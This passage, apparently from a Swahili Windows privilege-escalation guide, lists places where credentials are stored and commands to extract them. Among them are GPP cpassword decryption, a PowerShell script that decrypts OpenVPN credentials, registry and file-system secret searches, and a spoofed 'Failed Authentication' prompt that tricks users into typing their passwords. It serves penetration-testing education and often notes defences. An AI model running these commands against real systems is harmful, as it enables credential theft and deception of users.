Seva ya CI inaweza kuhifadhi mabadiliko ya source yaliyowasilishwa kwenye saraka yake ya data hata baada ya build kukamilika. [TeamCity inaeleza](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) kuwa `system/changes` huhifadhi mabadiliko ya remote-run; saraka ya data inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Patch inayosomeka inaweza kuhifadhi marejeo yaliyoondolewa au kuongezwa kuhusu faili ya credential, ufunguo wa usimbaji fiche, au script inayotumia vyote viwili. Kwa mfano, workflow ya PowerShell `ConvertTo-SecureString -Key` inahitaji ufunguo wa AES pamoja na string iliyosimbwa kwa njia fiche; [Microsoft inaeleza](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kuwa ufunguo hutolewa kando. Kagua majina ya patches zinazoweza kufikiwa kwanza, kisha kagua maudhui husika kwa idhini bila kuchapisha siri katika matokeo ya kawaida ya enumeration. Njia ya patch, thamani iliyosimbwa kwa njia fiche, au rejeo la ufunguo pekee havithibitishi credential halali au ufikiaji wa ruhusa kubwa zaidi. Weka ACL za saraka ya data zikiwa na vizuizi na uepuke kuingiza siri kwenye mabadiliko ya build.

### Mzunguko maalum wa kubadilisha password ya local administrator

Kibadilishaji password kilichotengenezwa kienyeji kinaweza kuhifadhi password iliyosimbwa kwa njia fiche ya local administrator kwenye service ya ndani, huku credentials za datastore yake zikiwa kwenye faili ya `.env` inayosomeka au kando ya binary ya updater. Kagua scheduled task ya updater, akaunti, ACL za usanidi, listener na ruhusa za datastore pamoja. Datastore inayosikiliza loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani aliye na credentials halali, lakini uthibitishaji pekee hauthibitishi ruhusa ya kusoma rekodi husika. Ikiwa seed ya usimbaji fiche au key material inapatikana kando ya ciphertext, kagua kwa makini jinsi ufunguo unavyotokana kabla ya kuamini usimbaji fiche. Mbinu inayotokana na seed iliyofichuka kwa namna inayoweza kurudiwa ili kupata ufunguo wa AES kupitia Go [`math/rand`](https://pkg.go.dev/math/rand) haifai kulinda password hiyo; Go inaeleza kuwa package hiyo haifai kwa randomness inayohusika na usalama. Thibitisha kuwa password yoyote iliyorejeshwa bado ni halali na ni ya akaunti iliyo kwenye kundi la local Administrators kabla ya kuichukulia kama njia ya escalation. Scheduled task, njia ya `.env`, au blob iliyosimbwa kwa njia fiche pekee havithibitishi masharti hayo. Usijumuishe password na key material katika matokeo ya kawaida ya enumeration.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kusimamia password za local administrator. Hifadhi yake inayotegemea directory au Entra na vidhibiti vya ufikiaji ni tofauti na datastore maalum ya ndani; vivyo hivyo, [roles za Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) huamua kama mtumiaji aliye-authenticate anaweza kusoma index maalum.

### Archives za plugin za seva ya Java na matumizi tena ya credentials

Baadhi ya plugins za seva za Java husambazwa kama JAR archives kwenye saraka ya `plugins` ya seva. Plugin maalum inayosomeka inaweza kuwa na usanidi au bytecode yenye credential ya service iliyopachikwa. Kagua archive hiyo ikiwa tu umeidhinishwa, na usijumuishe siri zilizorejeshwa katika matokeo ya kawaida ya enumeration. Njia ya plugin pekee haithibitishi kuwa siri ipo, na password ya service iliyorejeshwa husababisha ruhusa kubwa zaidi tu ikiwa pia ni halali kwa akaunti yenye ruhusa kubwa zaidi. Kagua ACL za faili husika na ubadilishe credentials zilizotumiwa tena kwa siri tofauti. Tazama [mwongozo wa usakinishaji wa plugins wa PaperMC](https://docs.papermc.io/paper/adding-plugins/) kwa mpangilio wa saraka na [nyaraka za JAR za Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kwa maudhui ya archive.

### Credentials za database iliyopachikwa ya Openfire

Usakinishaji wa Openfire unaotumia database iliyopachikwa unaweza kuhifadhi `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa akaunti ya sasa inaweza kuisoma, kagua rekodi za `OFUSER` na property ya `passwordKey` kwa pamoja. [Nyaraka za Openfire kuhusu user-provider](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) zinasema kuwa password zinaweza kuhifadhiwa kama maandishi ya kawaida au kusimbwa kwa njia fiche kwa ufunguo uliohifadhiwa kwenye property hiyo. Password iliyorejeshwa ina umuhimu wa escalation tu ikiwa bado ni halali kwa identity yenye ruhusa kubwa zaidi; jina la faili pekee halithibitishi uwezo wa kuisoma wala matumizi tena ya credential. Njia hiyo ni kidokezo cha inventory, kwa hiyo usijumuishe maudhui ya database na credentials katika matokeo ya kawaida ya enumeration.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kufichua porti zilizosanidiwa na kiolesura cha bind cha admin console hata kama database ya nje inatumika. Kwa kawaida Openfire hufunga admin console kwenye loopback; bado akaunti ya ndani inaweza kufikia anwani hiyo ikiwa listener inaendeshwa. Kagua listener halisi, admin role iliyoidhinishwa, sera ya kupakia plugins na identity ya Openfire service kwa pamoja. Admin anayeweza kusakinisha plugin anaweza kusababisha msimbo wa plugin kuendeshwa katika muktadha wa service, ambao unaweza kuwa na ruhusa kubwa ikiwa service inaendeshwa kama LocalSystem. Password ya akaunti inayolingana au njia ya usanidi inayosomeka pekee haithibitishi ufikiaji wa admin console au utekelezaji wa msimbo. Tazama [mwongozo wa vendor wa usakinishaji na usimamizi wa plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [property ya API ya kupakia plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Usanidi wa seva ya usimamizi wa uchunguzi wa kidijitali

Usanidi wa seva ya Velociraptor, ambao kwa kawaida huitwa `server.config.yaml`, unaweza kuwa na `CA.private_key` ya CA ya ndani. Ikiwa mtumiaji mwenye ruhusa za chini anaweza kusoma ufunguo huo, huenda akaweza kutengeneza client certificate ya API. Ikiwa hilo litasababisha ruhusa kubwa zaidi hutegemea user roles za seva, ufikikaji wa API na identity ambayo seva au agent lengwa huendeshwa nayo. Client configuration huwa na material tofauti; kuipata hakuthibitishi ufikiaji wa CA ya seva. Baadhi ya deployments huweka private key ya CA offline, kwa hiyo huenda usanidi wa seva unaosomeka usiwe na signing key.

Kwenye seva ya Windows, kagua ACL ya usanidi wa **seva** katika saraka yake ya usakinishaji na nakala zozote za backup zilizolindwa. Eneo moja linalowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia njia iliyosanidiwa ya service ikiwa ni tofauti. Thibitisha kuwa identity ya sasa inaweza kusoma faili na kwamba `CA.private_key` ipo kweli. Epuka kuchapisha private key kwenye logs au matokeo ya enumeration. Workflow ya vendor ya `config api_client` hutumia ufunguo wa CA kutoa client certificate, lakini role inayofaa upande wa seva pia inahitajika; kuunda au kubadilisha role kunaweza kuhitaji ruhusa ya kuandika datastore au kuwasha upya seva. Identity ya seva yenye ruhusa kubwa ambayo tayari ipo inaweza kutoa njia hata kama ruhusa hizo za kuandika hazipatikani. Maswali ya API yenye ruhusa za utekelezaji huendeshwa katika muktadha husika wa seva au agent, ambao unaweza kuwa na ruhusa kubwa.

Linda usanidi wa seva na backups kwa ACL zenye vizuizi, weka CA signing key offline inapowezekana, na punguza API roles na ufikiaji wa listener. Tazama [nyaraka za Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) na [mwongozo wa usanidi wa usalama](https://docs.velociraptor.app/docs/deployment/security/).

### Credentials za Putty

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni kidhibiti tofauti cha sessions. Hifadhi yake iliyosimbwa kwa njia fiche inaweza kuwa katika `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ilhali nakala rudufu ya session iliyohamishwa inaweza kuitwa `sessions-backup.dat` na kuhifadhiwa mahali pengine. [Mwongozo wa export wa SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) unasema export husimbwa kwa nenosiri na unaweza kuwa na sessions, keys, scripts, tags na relationships; [jukwaa lake la usaidizi](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) linataja hifadhi ya asili. Kwanza kagua ruhusa za faili na paths. Kupata mojawapo ya faili hizi hakufichui nenosiri lake wala kuthibitisha kwamba credential yoyote iliyohifadhiwa bado inafanya kazi au ina privileges za juu zaidi.

### Funguo za Host za SSH za PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Funguo za SSH kwenye registry

Funguo za faragha za SSH zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukipata ingizo lolote ndani ya njia hiyo, huenda likawa SSH key iliyohifadhiwa. Imehifadhiwa ikiwa imesimbwa kwa njia fiche, lakini inaweza kusimbuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa kuwasha, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya funguo za ssh, kuziongeza kwa `ssh-add` na kuingia kwenye mashine kupitia ssh. Registry HKCU\Software\OpenSSH\Agent\Keys haipo, na procmon haikuonyesha matumizi ya `dpapi.dll` wakati wa uthibitishaji wa asymmetric key.

### Faili za usanidi zisizohudhuriwa

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi ukitumia **metasploit**: _post/windows/gather/enum_unattend_

Maudhui ya mfano:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Nakala rudufu za SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazosomeka zinaweza pia kuwa na hives za `SAM`, `SECURITY`, na `SYSTEM` za offline. Tanguliza kukagua saraka za backup au image zinazofikika ndani ya kifaa na uhakiki **majina ya faili zilizomo** kwenye image kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hives ziko wazi, na image za kawaida za `install.wim`, `boot.wim`, na recovery mara nyingi huwa vipotoshi. SMB share ni njia tofauti ya ufikiaji na inapaswa kukaguliwa tu ikiwa share hiyo iko ndani ya wigo wa kazi. Tazama mwongozo wa Microsoft kuhusu [Windows image](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [marejeleo ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Vitambulisho vya Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Nenosiri la GPP lililohifadhiwa kwenye cache

Hapo awali kulikuwa na kipengele kilichoruhusu usambazaji wa akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML kwenye SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa domain. Pili, nenosiri ndani ya GPP hizi, lililosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi ulioandikwa hadharani, lingeweza kusimbuliwa na mtumiaji yeyote aliyeidhinishwa. Hili lilileta hatari kubwa, kwani lingeweza kuwawezesha watumiaji kupata ruhusa za juu.

Ili kupunguza hatari hii, kazi ilitengenezwa ya kutafuta faili za GPP zilizohifadhiwa kwenye cache ya ndani ambazo zina sehemu ya "cpassword" isiyo tupu. Ikipata faili kama hiyo, kazi husimbua nenosiri na kurejesha kitu maalum cha PowerShell. Kitu hiki kina maelezo kuhusu GPP na mahali faili ilipo, hivyo kusaidia kutambua na kurekebisha athari hii ya kiusalama.

Tafuta faili hizi katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Kusimbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata nywila:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye credentials:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Kumbukumbu za backup katika webroot ya IIS

Backup ya zamani ya ZIP iliyowekwa moja kwa moja kwenye webroot inayotolewa inaweza kufichua faili za awali za usanidi na credentials zinazoweza kutumiwa tena. Angalia physical path iliyosanidiwa ya tovuti na ikiwa kumbukumbu hiyo inaweza kufikiwa kupitia HTTP kabla ya kuichukulia kama ufichuzi. Njia chaguomsingi ya `C:\inetpub\wwwroot` ni eneo linalowezekana tu. Orodha ya haraka ya faili za ndani inaweza kuorodhesha majina na ukubwa bila kufungua kumbukumbu:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la jalada halithibitishi kuwa lina siri au kwamba taarifa za kuingia zilizopatikana zinatoa mamlaka ya juu.

### Taarifa za uthibitishaji za OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Kumbukumbu

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba credentials

Unaweza **kumwomba mtumiaji aweke credentials zake au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuzifahamu (kumbuka kwamba **kumwomba** mteja moja kwa moja **credentials** zake ni **hatari** sana):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana kuwa na **nywila** katika **maandishi wazi** au **Base64** wakati fulani yaliyopita

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Lahaja ya orodha ya majina ya faili bila kiendelezi cha Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 databases hutumia kwa kawaida kiendelezi cha `.psafe3`. Chukulia jina la faili linalolingana kama uwezekano wa kuwa vault iliyosimbwa; kuwepo kwake hakuthibitishi kwamba unaweza kuisoma, kuifungua au kutumia credentials zozote zilizohifadhiwa. Unapokagua mahali faili hizo zimehifadhiwa, angalia user profiles zinazofikika na root za kushiriki faili zilizosanidiwa.

Faili ya KeePass `.kdbx` inayosomeka pia ni kidokezo tu cha vault iliyosimbwa. Ili kuifungua, unahitaji master password halisi na key-file au vipengele vya akaunti vilivyos
anidiwa. Ikiwa ukaguzi ulioidhinishwa utapata jozi ya hash ya LM:NT kwenye ingizo, thibitisha akaunti iliyotajwa na kama NT hash hiyo ni ya sasa na inakubaliwa na huduma ya NTLM ya lengo kabla ya kuzingatia [pass-the-hash](../ntlm/README.md#pass-the-hash). Ingizo la vault halitoi haki za Administrator au SYSTEM lenyewe; ufikiaji wa huduma za mbali, haki za akaunti na hatua yoyote tofauti ya kutekeleza huduma lazima pia ziwepo. Orodha ya mali inapaswa kuripoti njia ya vault na kama inasomeka, si kuchapisha hifadhidata au credentials zilizohifadhiwa.

Tafuta faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Toleo la amri ya kutafuta bila kiendelezi cha Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Vitambulisho katika RecycleBin

Unapaswa pia kuangalia Bin ili kutafuta vitambulisho vilivyomo

Kagua maingizo ya Recycle Bin yaliyofutwa ambayo unaweza kuyafikia, ukitafuta nakala rudufu na kumbukumbu za usanidi, pamoja na faili ambazo majina yake yanataja vitambulisho waziwazi. Nakala rudufu muhimu ya `.7z`, `.zip`, au `.rar` inaweza kuwa na miezi kadhaa na kuwa na jina la kawaida. Windows huhifadhi njia ya awali na muda wa kufutwa katika rekodi ya `$I`, na faili iliyofutwa kama ingizo lake linalolingana la `$R`; kagua metadata na ruhusa ya sasa ya utambulisho wako kusoma faili kabla ya kufungua kumbukumbu. Uonekano hutegemea volume, SID ya mtumiaji, na ruhusa za faili, kwa hivyo orodha tupu haithibitishi kwamba hakuna nakala rudufu inayoweza kurejeshwa. Chukulia jina la kumbukumbu kama kitu cha kukagua, si uthibitisho kwamba lina siri halali.

Faili ya `.pfx` iliyofutwa ambayo unaweza kuifikia inaweza pia kuwa kidokezo cha **code-signing**. Ikiwa ina private key inayoweza kufikiwa, key hiyo inaweza kusaini script ya PowerShell iliyobadilishwa; [PowerShell inahitaji cheti cha code-signing chenye private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [sheria za publisher za AppLocker hukagua utambulisho wa msaini na upeo wa sheria](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji kati ya akaunti tofauti unahitaji utambulisho wa sasa uweze kurekebisha script husika, sheria inayotumika ikubali sahihi inayotokana nayo kwa script na akaunti lengwa, na scheduled task au programu nyingine yenye ruhusa za juu zaidi iendeshe script hiyo. Jina la faili la `.pfx`, subject ya cheti, au script inayoweza kuandikwa pekee havithibitishi mfuatano huo. Kagua metadata, ACL, sera, na amri ya kuratibiwa kabla ya kufungua nyenzo za private key au kuanzisha task hiyo.

Pia kagua hifadhidata za wasifu wa programu za ujumbe, noti, na faili ulizopokea unazoweza kufikia ili kutafuta vidokezo vya vitambulisho. Faili ya BitLocker recovery export inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya kumbukumbu ya nakala rudufu yenye jina. Nyenzo kama hizo zinaweza kutoa ufikiaji wa volume tofauti ya data iliyosimbwa kwa njia fiche, ambayo ina nakala rudufu za zamani; kagua volume na kumbukumbu hiyo tu ikiwa umeidhinishwa kuifikia. Ikiwa nakala rudufu ina `NTDS.dit`, kurejesha vitambulisho vya domain nje ya mtandao pia kunahitaji hive ya `SYSTEM` inayolingana, kama ilivyoelezwa katika [utaratibu wa nakala rudufu na vikundi vyenye ruhusa za juu](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa pekee havithibitishi kwamba kuna recovery key inayoweza kutumika au nakala rudufu ya domain.

Ili **kurejesha nywila** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Funguo nyingine zinazowezekana za registry zenye vitambulisho**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Toa openssh keys kutoka kwenye registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Vivinjari

Unapaswa kuangalia dbs ambako passwords za **Chrome au Firefox** zimehifadhiwa.\
Unapaswa kuangalia dbs ambako passwords za **Chrome, Edge au Firefox** zimehifadhiwa.\
Pia angalia historia, bookmarks na favourites za vivinjari ili kuona kama **passwords zimehifadhiwa** humo.

Kwa profile ya kawaida ya Edge **Default** ya mtumiaji wa sasa, `Login Data` iko chini ya `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, huku `Local State` ikiwa kwenye directory yake mama ya `User Data`. [Microsoft inaeleza mahali profile chaguomsingi ilipo](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); profile nyingine au sera ya `UserDataDir` inaweza kuihamisha. Kuwepo kwa faili ni kidokezo tu cha eneo la kuhifadhi credentials: thibitisha kuwa faili zinasomeka, kuwa una muktadha wa DPAPI wa mtumiaji husika au key material nyingine iliyoidhinishwa, na kama login iliyohifadhiwa ni ya akaunti yenye mamlaka zaidi. Kuhesabu njia pekee hakuhitaji kufungua database au kuchapisha passwords zilizofumbuliwa.

Kwa Firefox, [Mozilla inaeleza](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kuwa `key4.db` na `logins.json` za profile ni faili zinazohusiana za key na login zilizosimbwa kwa njia fiche. Kuwepo kwake ni kidokezo tu: angalia kama faili zote mbili zinasomeka, kama kuna entries zilizohifadhiwa na kama Primary Password inalinda key kabla ya kuhitimisha kuwa credentials zinaweza kutumika. Ikiwa credential iliyopatikana ni ya akaunti ya domain, kagua kando haki halisi za udhibiti wa vikundi za akaunti hiyo na haki za kikundi za [kusoma au kufumbua password ya LAPS](../active-directory-methodology/laps.md); artifacts za kivinjari pekee hazithibitishi kuwa kuna njia ya kupata mamlaka ya administrator.

Tools za kutoa passwords kutoka kwenye vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

